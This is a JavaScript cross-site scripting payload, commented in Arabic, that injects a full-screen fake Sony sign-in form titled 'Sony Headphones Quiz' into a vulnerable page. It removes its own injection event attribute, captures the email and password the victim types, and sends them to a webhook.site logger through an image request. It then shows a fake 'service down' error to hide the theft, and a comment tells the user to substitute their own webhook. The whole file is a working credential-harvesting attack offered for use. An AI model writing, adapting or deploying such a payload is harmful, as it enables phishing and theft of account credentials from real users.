(function() {
    // 1. التحقق من وجود القفل لمنع التكرار نهائياً
    if (window.XSS_LOADED) return;
    window.XSS_LOADED = true; 

    // 2. محاولة حذف الحدث من العنصر لزيادة التأكيد
    try {
        var el = document.querySelector('[oncontentvisibilityautostatechange]');
        if (el) {
            el.removeAttribute('oncontentvisibilityautostatechange');
            el.style.contentVisibility = 'visible'; // تثبيت الحالة
        }
    } catch(e) {}

    // 3. إنشاء الفورم وحقنه مرة واحدة فقط
    var modal = document.createElement('div');
    modal.id = 'sony-xss-modal';
    modal.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(8px);">
        <div style="background:#fff;padding:40px;border-radius:12px;width:100%;max-width:400px;text-align:center;font-family:Arial,sans-serif;box-shadow:0 20px 40px rgba(0,0,0,0.4);">
            <img src="https://sony.net" width="120" style="margin-bottom:20px;">
            <h2 style="color:#000;font-size:24px;margin-bottom:10px;">Sign In</h2>
            <p style="color:#666;margin-bottom:25px;">To continue to Sony Headphones Quiz</p>
            
            <input type="email" id="u" placeholder="Email address" style="width:100%;padding:14px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box;">
            <input type="password" id="p" placeholder="Password" style="width:100%;padding:14px;margin-bottom:20px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box;">
            
            <button id="s" style="width:100%;padding:15px;background:#0071e3;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;">Sign In</button>
        </div>
    </div>`;

    document.body.appendChild(modal);

    // 4. وظيفة الإرسال
    document.getElementById('s').onclick = function() {
        var email = document.getElementById('u').value;
        var pass = document.getElementById('p').value;
        if(email && pass) {
            // استبدل الرابط برابط Webhook الخاص بك
            var logger = "https://webhook.site/1f5c01fc-72f2-4a77-9b53-b93d57154665"; 
            new Image().src = logger + "?u=" + encodeURIComponent(email) + "&p=" + encodeURIComponent(pass);
            alert("Error: Authentication service is temporarily down. Please try again later.");
            modal.remove();
        }
    };
})();
